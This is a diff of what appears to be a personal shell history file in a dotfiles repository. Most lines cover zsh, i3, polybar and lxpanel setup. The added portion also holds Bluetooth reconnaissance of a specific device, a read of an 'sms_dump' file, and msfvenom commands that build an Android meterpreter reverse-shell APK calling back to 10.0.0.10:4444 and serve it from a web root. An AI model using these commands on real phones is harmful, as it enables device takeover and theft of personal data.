@@ -1,143 +1,3 @@
-chsh -s /usr/bin/zsh suadmin
-chsh -s /usr/bin/zsh suadmin
-chsh -s /usr/bin/zsh
-usermod -s /bin/zsh 
-usermod -s /usr/bin/zsh 
-usermod -s /usr/bin/zsh suadmin
-echo $SHELL
-sudo usermod -s /usr/bin/zsh suadmin
-sudo vipw
-sudo vim /etc/passwd
-echo $SHELL
-kill -9 -1
-zsh
-exi
-exit
-zsh-newuser-install
-exit
-cd
-vim .zshrc 
-sudo vim .zshrc 
-cd .dotfiles/
-vim .zshrc 
-cd
-vim .oh-my-zsh/
-cd .oh-my-zsh/
-cd ..
-ll
-lla
-lla | egrep "."
-lla | egrep "\."
-lla | egrep "\.*"
-exit
-ls
-chsh -s /usr/bin/zsh 
-kill -9 -1
-uninst zsh
-sudo updatedb
-locate zsh
-rm -rf /usr/share/zsh
-sudo rm -rf /usr/share/zsh
-sudo updatedb
-locat zsh
-locate zsh
-cleanpac 
-sudo rm -rf /usr/lib/zsh
-sudo updatedb
-locate zsh
-sudo rm -rf /etc/zsh
-rm -rf .zsh*
-sudo udpatedb
-sudo updatedb
-locate zsh
-rm -rf /usr/bin/zsh /usr/bin/zsh-5.8 
-sudo rm -rf /usr/bin/zsh /usr/bin/zsh-5.8 
-sudo updatedb
-locate zsh
-sudo pacman -S zsh
-sudo pacman -S zsh
-chsh -s zsh
-echo $SHELL
-chsh -s /usr/bin/zsh
-echo $SHELL
-chsh -s /usr/bin/zsh
-ls
-lscpu
-lslocks
-ps -tulpn
-htop
-lsmem
-python 
-python --version
-uname -r
-uname -a
-listapps.sh 
-lsdf ajksfd alksdf 
-
-uninst surf
-uninst tabbed
-listapps.sh 
-pacclean
-uninst zsh-syntax-highlighting
-locate zsh
-rm -rf /usr/share/zsh/*
-sudo rm -rf /usr/share/zsh/*
-sudo updatedb
-locate zsh
-zsh
-pacman -Runs zsh
-sudo pacman -Runs zsh
-reboot
-vim .vimrc
-cd .config/alacritty/
-vim alacritty.yml 
-cat alacritty.yml | grep -ve ^#
-vim alacritty.yml 
-vim .vimrc
-mv .vimrc .vimrcbak
-lla
-lla | fzf
-vim .viminfo
-vim .vimrcbak 
-mv .vimrcbak .vimrc
-vim .vimrc 
-vim .vimrc 
-lwwdir 
-cd scripts/
-cd ..
-vim .bash_aliases 
-vim .bash_aliases 
-inst sxhkd
-cd .config/
-cd 
-cd .config/sxhkd/
-vim sxhkdrc 
-cd ..
-cd tint2/
-vim tint2rc
-polybar 
-cd
-cd .config/polybar/
-ls
-./launch.sh 
-vim config.ini 
-polybar main
-polybar --help
-uninst polybar
-yay -S polybar-git
-sudo updatedb
-locate polybar
-timshift -list
-timeshift
-sudo timeshift --list
-locate timeshift
-cd /var/log/timeshift/
-locate polybar
-cd /timeshift/
-cd snapshots
-ls
-cd 2020-09-06_11-08-39/
-vim exclude.list 
 timeshift
 timeshift --list-shapshots
 sudo timeshift --list-shapshots
@@ -498,3 +358,143 @@ dolphin
 kill -9 -1
 pkill picom
 pacman -R dolphin
+htop
+cd .dotfiles/
+git pull
+git config pull.rebase true
+git pull
+git config pull.ff only
+git pull
+git fetch
+git status
+git pull
+git stash
+git status
+git pull
+git status
+apt list
+apt list i3-gaps
+vim .config/i3/config 
+cat .config/i3/config 
+vim .config/i3/config 
+git stash
+git pull
+sudo apt-get lxpanel
+sudo apt search lx
+sudo apt search lx-panel
+sudo apt search lxpanel
+sudo apt install lxpanel
+xmodmap
+xmodmap --help
+fzf
+xmodmap -pk
+xmodmap -pke
+xmodmap -pke | fzf
+uname -r
+uname -a
+man i3
+i3 border normal
+#for_window [class="^.*"] border pixel 2
+for_window [class="^.*"] border pixel 2
+i3 for_window [class="^.*"] border pixel 2
+i3 for_window [class="^.*"] border normal
+i3 for_window \[class="^.*"\] border normal
+i3 for_window \[class=\"^.*\"\] border normal
+cd .dotfiles/scripts/homemonitor.sh 
+cd .dotfiles/scripts/
+bash homemonitor.sh 
+sudo apt-get upgrade
+sudo apt-get update
+sudo apt-get upgrade
+ifconfig
+ip addr
+msfvenom --help
+nsfvenon -p --list
+msfvenom -p --list
+msfvenom --list
+msfvenom --list payloads
+hciconfig
+hciconfig hci0 up
+sudo hciconfig hci0 up
+hciconfig
+hcitool scan
+hcitool name E0:37:17:7A:18:D4
+mac = E0:37:17:7A:18:D4
+mac="E0:37:17:7A:18:D4"
+echo $mac
+hcitool inq $mac
+hcitool inq E0:37:17:7A:18:D4
+hcitool inq E0:37:17:7A:18:D4 2
+hcitool inq --length=2 E0:37:17:7A:18:D4 
+hcitool inq
+man sdptool
+sdptool browse $mac
+hcitool inq
+l2pint $mac
+l2ping $mac
+sudo l2ping $mac
+btscanner
+btscanner
+sudo apt install btscanner
+btscanner
+btscanner help
+btscanner --help
+bt-device --list
+sudo /etc/init.d/bluetooth start
+systemctl enable bluetooth
+sudo systemctl enable bluetooth
+systemctl status bluetooth
+hciconfig
+hciconfig inq
+hciconfig scan
+hcitool scan
+btscanner --help
+btscanner
+btscanner
+btscanner
+ls
+cat sms_dump_20210116050728.txt 
+htop
+sudo apt install armitage
+armitage
+nexpose
+sudo shutdown
+sudo shutdown -c
+sudo reboot -s
+shutdown --help
+sudo reboot
+ifconfig
+ip addr
+msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.10 LPORT=4444 R>/var/www/html/ehacking.apk
+sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.10 LPORT=4444 R>/var/www/html/ehacking.apk
+sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.10 LPORT=4444 R> /var/www/html/ehacking.apk
+sudo chown -R $USER:$USER /var/www
+sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.10 LPORT=4444 R> /var/www/html/ehacking.apk
+service apache2 status
+systemctl status apache2
+systemctl start apache2
+systemctl status apache2
+msfconsole
+msfconsole
+lxpanel
+sudo apt search lxdpanel
+apt search lxdtpanel
+apt search lxpanel
+apt search lxdepanel
+apt search lxde-panel
+apt search panel
+sudo apt install lxdpanel
+sudo apt install lxpanel
+pkill -9 -1
+kill -9 -1
+sudo apt install dolphin
+sudo apt install pcmanfm
+ls
+rm -rf reconspider/
+ls
+sudo rm -rf reconspider/
+cd tryhackme/
+ls
+pkill tint2
+pkill lxpanel
+lxpanel
